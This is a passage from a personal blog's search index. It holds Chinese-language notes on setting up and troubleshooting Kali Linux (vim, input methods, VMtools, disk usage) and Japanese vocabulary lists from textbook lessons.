    <content type="html"><![CDATA[<h2 id="Kali的问题-linux命令"><a href="#Kali的问题-linux命令" class="headerlink" title="Kali的问题(linux命令):"></a>Kali的问题(linux<a href="https://www.runoob.com/linux/linux-command-manual.html">命令</a>):</h2><ul><li>虚拟机的安装(又装了一遍)</li><li>VMtools的安装(为什么网上会有这么多的<a href="https://blog.csdn.net/love20165104027/article/details/83377758">方法</a>.</li><li>中文输入法Ibus的<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">安装(</a>两行命令解决的事情有些教程搞得几十行,就离谱)</li><li>vim插件(彻底的失败) 不过在vim设置文件里设置了几个<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">常用的</a>.</li><li>密码问题, root初始密码忘记, root下passwd指令.   默认账号kali kali</li><li>vim在share文件夹里</li><li>中文输入法出现[Invalid-UTF-8 code], 改成半角中文即可</li><li>make btest出错, 修改Makefile为生成64位可执行文件<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</li><li>LInux中可执行文件和后缀名无关, 和文件的属性有关(????</li><li>bitset是一个类模板</li><li>GDB以及gcc的<a href="https://zhuanlan.zhihu.com/p/74897601">使用</a>(详见零碎知识)</li><li>kali如何运行可执行文件: ./bomb</li><li>set nohlsearch(no highlight search)</li><li>中文输入法下输入命令:w按下回车vim会卡死, <strong>输入逗号也能卡死?????</strong></li><li>kali装Chrome:他有sandbox机制, 无法在root用户下运行<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</li><li>kali使用vpn:  <strong>失败</strong>.</li><li>kill占了端口的进程<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</li><li>虚拟机卡死时查找log文件里的pid, 在任务管理器里停止</li><li>查看磁盘使用情况<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</li><li>Typora的安装<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">问题</a>.</li><li>.tar文件相关<a href="https://zhidao.baidu.com/question/873537413743808372.html">问题</a>.</li><li>root用户安装了vmtool, 切换到lbjyye后需要重新安装(?)</li><li>修改命令行终端字体大小: ~/.config/qterminal.org/qterminal.ini 里的fontsize或fontfamily并将其改为只读文件(<strong>新版完全没这个问题</strong>)</li><li>要显示隐藏文件夹直接到工具栏上的视图里去找</li><li><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">延长</a>锁屏时间</li><li>终端补全只要方向键</li><li>关机命令 init 0</li><li>chorme里<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">添加</a>搜索引擎</li><li>vim无法打开文件, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">改为</a>下载GVIM</li><li>啥玩意儿啊, kali2021干吗搞没了图形界面clash弄半天也没成<a href="https://dcrelay.me/#/knowledge">[0]</a></li><li>main函数的两个参数: 一个是命令参数的个数, 另一个是命令参数数组,argv[0]是程序本身的文件名</li><li>快照管理其中的保留是防止自动保存的快照被删除</li><li>**Typora里使用中文状态下的Ctrl+A, 文件直接丢失!!!!**太特么蠢了.</li><li>/usr/share/vim/vim82/colors/有vim的主题<ul><li>industry 全黑,  evening 还行, koel 超级黑的背景, morning 灰白很不错, murpy又是黑的字体细点,  peachpuff 桃色背景, shine 亮瞎狗眼 颜色太浅, slate 字体太紧, zellner 平平无奇的白底, 剩下的不用考虑</li></ul></li><li>了解了链接引用和脚注是个<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">啥</a>.</li><li>Operation inconsistent with current state。VM报错, 只要以管理员身份运行就可以了</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>日本語</title>
    <link href="/2021-05/Learning-%E6%97%A5%E6%9C%AC%E8%AA%9E/"/>
    <url>/2021-05/Learning-%E6%97%A5%E6%9C%AC%E8%AA%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="外来语"><a href="#外来语" class="headerlink" title="外来语"></a>外来语</h2><p><a href="https://www.ixueshu.com/document/52df575bd5734312318947a18e7f9386.html">外来语的转换</a>.</p><h2 id="易忘"><a href="#易忘" class="headerlink" title="易忘"></a>易忘</h2><h5 id="第四课"><a href="#第四课" class="headerlink" title="第四课"></a>第四课</h5><p>居間　いま　起居室</p><p>箱　はこ</p><p>上下左右<strong>前’後ろ’</strong>中<u>外</u>　:　うえ　した　ひだり　みぎ　<strong>まえ　’うしろ’</strong>　なか　<u>そと</u></p><p>売店　ばいてん　小卖部</p><p>います　「动2」</p><h5 id="第五课"><a href="#第五课" class="headerlink" title="第五课"></a>第五课</h5><p>終わります　おわります</p><p>起きます        おきます</p><p>遅刻　ちこく</p><p>おととい➡昨日（きのう）↦今日（きょう）⇒明日（あした）⇒明後日（あさって）(后天)</p><h5 id="第八课"><a href="#第八课" class="headerlink" title="第八课"></a>第八课</h5><p>夕方　ゆうがた　傍晚</p><p>チョコレ<strong>ー</strong>ト、スプ<strong>ー</strong>ン、アイスクリ<strong>ー</strong>ム</p><p>昼休み　ひるやすみ</p><p>番号        ばんご<strong>う</strong>.</p><p>送ります　おくります</p><p>作ります　つくります</p><p>太ります　ふとります</p><p>出します　だします</p><p>会います　あいます　见面</p><p>かけます　打电话</p><p>もらいます　得到</p><p>あげます　给</p><p>​            ————<strong>基本全部不记得</strong>.</p><h5 id="第十四课"><a href="#第十四课" class="headerlink" title="第十四课"></a>第十四课</h5><p>洗います　あらいます</p><h5 id="第十六课"><a href="#第十六课" class="headerlink" title="第十六课"></a>第十六课</h5><p>直します　なおします</p><p>知ります　しります</p><p>長い　ながい　3</p><p>短い　みじかい　3</p><p>軽い　かるい　2</p><h2 id="特殊的い段二类动词"><a href="#特殊的い段二类动词" class="headerlink" title="特殊的い段二类动词"></a>特殊的い段二类动词</h2><p><strong>标日初级全册出现过的：</strong></p><p>見ますmi 看见</p><p>感じますka n 感觉，觉得，感到，感想，感动</p><p>通じますtsu u 通，通往，通晓，精通，熟悉，领会，相通，通用</p><p>信じますshi n 相信，信仰</p><p>過ぎますsu 经过，过去，逝去，超过，过分，过度，过火生(活)</p><p>きますi 活，生活，生存，保存生命，谋生，生动，栩栩如生，有效，有意义</p><p>起きますo 起床，起来，睡醒，事件发生</p><p>出来（でき）ます做好，做完，建成，形成，出现，发生，出产，能够</p><p>下りますo着陆，上锁，消除，卸下，排泄，落下，卸下烦恼 </p><p>降りますo 下来，降落，辞职，退出落(堕)</p><p>ちますo 落下，坠落，脱落，褪色，低落，陷落，被攻陷，衰落，落榜，逃走，遗漏</p><p>借りますka 借，租借，借用，利用</p><p>浴びまa bi 浇，淋，浴，照，晒，受到，蒙受，遭到</p><p>居（い）ます在</p><p>着ますki 穿，承受</p><p>似ますni 相似像</p><p>足ります ta 够，足够，能够，值得，可以，充分，足以</p><h4 id="上册出现过的"><a href="#上册出现过的" class="headerlink" title="上册出现过的"></a>上册出现过的</h4><p>浴びます（浇,淋,浴）、います（有）、起きます（起床）、降ります（下）、借ります（借）、着ます（穿）、過ぎます（过）、できます（会,能）、見ます（看）</p>]]></content>
    
    
    <categories>
      
      <category>日本語</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日本語</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
